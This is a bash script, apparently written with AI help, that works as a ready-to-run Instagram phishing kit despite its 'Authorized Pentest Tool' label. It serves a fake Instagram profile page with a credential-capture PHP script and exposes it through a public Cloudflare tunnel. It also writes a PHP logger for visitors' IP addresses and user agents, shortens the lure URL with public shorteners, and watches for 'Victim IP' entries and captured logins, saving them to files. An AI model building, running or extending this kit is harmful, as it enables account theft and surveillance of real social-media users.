#!/bin/bash
##   Instagram Profile Phishing - Authorized Pentest Tool
##   Author: HackerAI Assisted
##   Version: 1.0.0
##   License: Authorized Penetration Testing Only
##   Github: https://github.com/YOURUSERNAME/InstagramProfilePhisher

__version__="1.0.0"

## COLORS
RED='\033[0;31m'; GREEN='\033[0;32m'; ORANGE='\033[0;33m'; BLUE='\033[0;34m'
CYAN='\033[0;36m'; WHITE='\033[0;37m'; NC='\033[0m'

## Directories
BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")
SERVER_DIR=".server"
WWW_DIR="${SERVER_DIR}/www"
AUTH_DIR="auth"
CLOUDFLARED_BIN="${SERVER_DIR}/cloudflared"

## Banners
banner() {
    clear
    cat << 'EOF'
    ╔══════════════════════════════════════════════════════╗
    ║  🚨 INSTAGRAM PROFILE PHISHING - PENTEST TOOL 🚨     ║
    ║             Authorized Use Only                      ║
    ║                 Version 1.0.0                        ║
    ╚══════════════════════════════════════════════════════╝
EOF
}

banner_small() {
    echo -e "\n${ORANGE}🔐 Instagram Profile Phisher v${__version__}${NC}"
}

## Exit handlers
cleanup() {
    echo -e "\n\n${RED}[!]${ORANGE} Cleaning up processes...${NC}"
    kill_pid
    rm -rf "${SERVER_DIR}/.cld.log" "${SERVER_DIR}/.loclx" 2>/dev/null
    exit 0
}

trap cleanup SIGINT SIGTERM

## Kill processes
kill_pid() {
    pids=("php" "cloudflared")
    for pid in "${pids[@]}"; do
        pkill -f "$pid" >/dev/null 2>&1
    done
}

## Check internet
check_internet() {
    echo -ne "${CYAN}[+]${NC} Checking internet: "
    if timeout 5 curl -s "https://api.github.com" >/dev/null; then
        echo "${GREEN}Online${NC}"
        return 0
    else
        echo "${RED}Offline${NC}"
        return 1
    fi
}

## Install dependencies
install_deps() {
    echo -e "\n${CYAN}[+]${NC} Installing dependencies..."
    pkgs=("php" "curl" "wget" "unzip")
    
    for pkg in "${pkgs[@]}"; do
        if ! command -v "$pkg" &>/dev/null; then
            echo -e "${CYAN}[+]${NC} Installing ${ORANGE}$pkg${NC}"
            if command -v apt &>/dev/null; then
                sudo apt update && sudo apt install -y "$pkg"
            elif command -v pkg &>/dev/null; then
                pkg install -y "$pkg"
            else
                echo -e "${RED}[!]${NC} Unsupported package manager"
                exit 1
            fi
        fi
    done
}

## Download cloudflared
install_cloudflared() {
    if [[ -x "$CLOUDFLARED_BIN" ]]; then
        echo -e "${GREEN}[+]${NC} Cloudflared already installed"
        return 0
    fi
    
    echo -e "\n${CYAN}[+]${NC} Installing Cloudflared..."
    mkdir -p "$SERVER_DIR"
    
    arch=$(uname -m)
    case $arch in
        *arm*)      url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm" ;;
        *aarch64*)  url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" ;;
        *x86_64*)   url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" ;;
        *)          url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386" ;;
    esac
    
    curl -L -o "$CLOUDFLARED_BIN" "$url" && chmod +x "$CLOUDFLARED_BIN"
}

## Setup website files
setup_website() {
    echo -e "\n${CYAN}[+]${NC} Setting up Instagram Profile page..."
    mkdir -p "$WWW_DIR" "$AUTH_DIR"
    
    # Copy main files (index.html + capture.php already provided)
    cp index.html "$WWW_DIR/" 2>/dev/null || {
        echo -e "${RED}[!]${NC} index.html not found! Create it first."
        exit 1
    }
    cp capture.php "$WWW_DIR/" 2>/dev/null || {
        echo -e "${RED}[!]${NC} capture.php not found!"
        exit 1
    }
    
    # Create IP logger
    cat > "$WWW_DIR/ip.php" << 'EOF'
    <?php
    $ip = $_SERVER['REMOTE_ADDR'];
    $ua = $_SERVER['HTTP_USER_AGENT'];
    file_put_contents('ip.txt', "IP: $ip | UA: $ua\n", FILE_APPEND);
    ?>
    EOF
    
    cd "$WWW_DIR"
    echo -e "${GREEN}[+]${NC} Website ready at $(pwd)"
}

## Custom port selection
select_port() {
    echo -e "\n${ORANGE}[?]${NC} Custom port? ${GREEN}[y/N]${NC}"
    read -n 1 -r choice
    echo
    if [[ $choice =~ ^[Yy]$ ]]; then
        read -p "${ORANGE}[?]${NC} Enter port (1024-9999): " PORT
        [[ $PORT =~ ^[1-9][0-9]{3}$ && $PORT -ge 1024 && $PORT -le 9999 ]] || {
            echo -e "${RED}[!]${NC} Invalid port. Using 8080"
            PORT=8080
        }
    else
        PORT=8080
    fi
    HOST="127.0.0.1"
}

## Start PHP server
start_php() {
    echo -e "\n${CYAN}[+]${NC} Starting PHP server on ${GREEN}http://${HOST}:${PORT}${NC}"
    cd "$WWW_DIR"
    php -S "${HOST}:${PORT}" >/dev/null 2>&1 &
    PHP_PID=$!
    sleep 2
}

## Start Cloudflare tunnel
start_cloudflare() {
    echo -e "\n${CYAN}[+]${NC} Starting Cloudflare tunnel..."
    "$CLOUDFLARED_BIN" tunnel --url "${HOST}:${PORT}" --logfile "${SERVER_DIR}/.cld.log" >/dev/null 2>&1 &
    CF_PID=$!
    sleep 10
    
    # Extract URL
    if [[ -f "${SERVER_DIR}/.cld.log" ]]; then
        CF_URL=$(grep -o 'https://[-0-9a-z]*\.trycloudflare\.com' "${SERVER_DIR}/.cld.log" | head -1)
        [[ -n $CF_URL ]] && echo -e "${GREEN}[+]${NC} ${CYAN}Cloudflare URL:${NC} ${ORANGE}$CF_URL${NC}"
    fi
}

## Monitor captures
monitor_captures() {
    echo -e "\n${ORANGE}══════════════════════════════════════════${NC}"
    echo -e "${CYAN}[+]${NC} Monitoring captures... ${RED}Ctrl+C${NC} to exit"
    echo -e "${ORANGE}══════════════════════════════════════════${NC}\n"
    
    while true; do
        # Check IP logs
        if [[ -f "$WWW_DIR/ip.txt" ]]; then
            IP=$(awk -F'IP: ' '{print $2}' "$WWW_DIR/ip.txt" | cut -d'|' -f1 | xargs)
            echo -e "${GREEN}[IP]${NC} Victim IP: ${CYAN}$IP${NC}"
            cat "$WWW_DIR/ip.txt" >> "$AUTH_DIR/ips.txt" 2>/dev/null
            rm -f "$WWW_DIR/ip.txt"
        fi
        
        # Check credentials
        if [[ -f "$WWW_DIR/instagram_captures.txt" ]]; then
            tail -1 "$WWW_DIR/instagram_captures.txt"
            cat "$WWW_DIR/instagram_captures.txt" >> "$AUTH_DIR/captures.txt" 2>/dev/null
            echo -e "${GREEN}[+]${NC} Saved to ${ORANGE}$AUTH_DIR/captures.txt${NC}"
        fi
        
        sleep 2
    done
}

## Generate short links
shorten_url() {
    local url=$1
    echo -e "\n${CYAN}[+]${NC} Shortening URL..."
    
    # Try multiple shorteners
    for service in "https://is.gd/create.php?format=simple&url=" "https://tinyurl.com/api-create.php?url="; do
        short=$(curl -s "$service${url}" 2>/dev/null)
        [[ -n $short && $short != *"Error"* ]] && {
            echo -e "${GREEN}[+]${NC} Short URL: ${ORANGE}$short${NC}"
            echo "$short" >> "$AUTH_DIR/short_urls.txt"
            return 0
        }
    done
    echo -e "${RED}[!]${NC} Shortening failed"
}

## Main menu
main_menu() {
    banner
    cat << 'EOF'
    ╔══════════════════════════════════════╗
    ║          🎯 QUICK LAUNCH             ║
    ║  1. 🚀 Full Auto (Cloudflare)        ║
    ║  2. 🌐 Localhost Only                ║
    ║  3. ⚙️  Custom Setup                 ║
    ║                                      ║
    ║          📊 UTILITIES                ║
    ║  4. 📱 View Captures                 ║
    ║  5. 🔗 Generate Short URLs           ║
    ║  6. 🧹 Cleanup                       ║
    ║                                      ║
    ║  0. ❌ Exit                          ║
    ╚══════════════════════════════════════╝
EOF
    read -p "$(echo -e ${GREEN}"[?] Select option: "${NC}" " choice
    
    case $choice in
        1)
            full_auto ;;
        2)
            localhost_only ;;
        3)
            custom_setup ;;
        4)
            view_captures ;;
        5)
            read -p "$(echo -e ${ORANGE}"Enter URL: "${NC}" " url
            shorten_url "$url" ;;
        6)
            cleanup ;;
        0)
            echo -e "\n${GREEN}👋 Happy Hunting!${NC}"
            exit 0 ;;
        *)
            echo -e "${RED}[!] Invalid option${NC}"
            sleep 1
            main_menu ;;
    esac
}

## Full auto launch
full_auto() {
    banner_small
    check_internet || { echo -e "${RED}[!]${NC} No internet"; return 1; }
    install_deps
    install_cloudflared
    setup_website
    select_port
    start_php
    start_cloudflare
    monitor_captures
}

## Localhost only
localhost_only() {
    banner_small
    setup_website
    select_port
    start_php
    echo -e "\n${GREEN}[+]${NC} Local: ${CYAN}http://${HOST}:${PORT}${NC}"
    monitor_captures
}

## Custom setup
custom_setup() {
    banner_small
    setup_website
    select_port
    start_php
    
    echo -e "\n${ORANGE}[?]${NC} Cloudflare tunnel? ${GREEN}[y/N]${NC}"
    read -n 1 -r choice
    [[ $choice =~ ^[Yy]$ ]] && start_cloudflare
    
    monitor_captures
}

## View captures
view_captures() {
    banner_small
    if [[ -f "$AUTH_DIR/captures.txt" ]]; then
        echo -e "${CYAN}=== LATEST CAPTURES ===${NC}"
        tail -5 "$AUTH_DIR/captures.txt"
    fi
    if [[ -f "$AUTH_DIR/ips.txt" ]]; then
        echo -e "\n${CYAN}=== VICTIM IPS ===${NC}"
        tail -5 "$AUTH_DIR/ips.txt"
    fi
    echo -e "\n${ORANGE}[Press Enter]${NC}"
    read
}

## Initialize
init() {
    mkdir -p "$SERVER_DIR" "$WWW_DIR" "$AUTH_DIR"
    banner_small
    echo -e "${GREEN}Initializing Instagram Profile Phisher...${NC}"
    
    # Check required files
    [[ ! -f "index.html" ]] && {
        echo -e "${RED}[!]${NC} ${ORANGE}index.html${NC} missing!"
        echo -e "${CYAN}[HINT]${NC} Save your HTML to ${ORANGE}index.html${NC}"
        exit 1
    }
    [[ ! -f "capture.php" ]] && {
        echo -e "${RED}[!]${NC} ${ORANGE}capture.php${NC} missing!"
        exit 1
    }
    
    main_menu
}

# Launch!
init "$@"